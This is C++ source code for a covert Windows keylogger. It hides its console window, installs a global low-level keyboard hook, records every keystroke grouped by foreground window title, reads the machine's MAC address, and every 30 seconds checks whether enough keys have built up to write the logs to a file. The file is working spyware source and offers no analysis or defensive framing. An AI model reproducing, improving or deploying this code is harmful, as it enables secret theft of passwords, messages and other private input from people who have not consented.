#include "Utils.h"
#include <thread>

static bool shiftKey = false;
static bool capslockKey = false;
UtilFuncs utilClass;

NewMap loggedKeysMap;

std::string loggedKeys;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)) {
		PKBDLLHOOKSTRUCT keyInfo = (PKBDLLHOOKSTRUCT)lParam;
		HWND foregroundWindow = GetForegroundWindow();
		char windowNameTmp[50];
		GetWindowText(foregroundWindow, windowNameTmp, 50);
		std::string windowName(windowNameTmp);
		
		bool printable;
		std::string str;

		utilClass.VKCodetoString(keyInfo, str);

		if (str.find("NUM") != std::string::npos) {
			utilClass.treatNumpadCases(str);
		}
		
		printable = (str.length() <= 1) ? true : false;

		if (!printable) {
			if (str == "SHIFT") {
				shiftKey = true;
			} else if (str == "CAPSLOCK") {
				capslockKey = !capslockKey;
			} else if (str == "ENTER") {
				str = "<br />";
				printable = true;
			} else if (str == "SPACE") {
				str = " ";
				printable = true;
			} else if (str == "TAB") {
				str = "\t";
				printable = true;
			} else if (str == "GRAVE") {
				str = "`";
				printable = true;
			} else if (str == "ACUTE/CEDILLA") {
				str = "'";
				printable = true;
			}
		}

		if (printable) {
			if (capslockKey) {
				str[0] = toupper(str[0]);
			} else if (shiftKey) {
				utilClass.treatShiftCases(str);
			} else {
				str[0] = tolower(str[0]);
			}

			if (loggedKeysMap.count(windowName) > 0) {
				loggedKeysMap[windowName].append(str);
			} else {
				loggedKeysMap[windowName] = str;
			}
			
			loggedKeys.append(str);
		}

	} else if (nCode == HC_ACTION && (wParam == WM_SYSKEYUP || wParam == WM_KEYUP)) {
		PKBDLLHOOKSTRUCT keyInfo = (PKBDLLHOOKSTRUCT)lParam;
		bool printable;

		std::string str;
		
		utilClass.VKCodetoString(keyInfo, str);

		printable = (str.length() <= 1) ? true : false;

		if (!printable) {
			if (str == "SHIFT") {
				shiftKey = false;
			}
		}
	}

    return(CallNextHookEx(NULL, nCode, wParam, lParam));
}

void writeLogToFile() {
	while (true) {
		Sleep(30000);
		if (loggedKeys.size() >= 1000) {
			utilClass.writeLogToFile(loggedKeysMap);
			loggedKeysMap.clear();
			loggedKeys.clear();
		}
	}
}

int _tmain(int argc, _TCHAR* argv[]) {

	ShowWindow ( GetConsoleWindow(), SW_HIDE );

	utilClass.Hide();
	utilClass.getMacAddress();
	
	std::thread first (writeLogToFile);

	HHOOK kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);

    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) { 
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(kbHook);

    return(0);

	return 0;
}

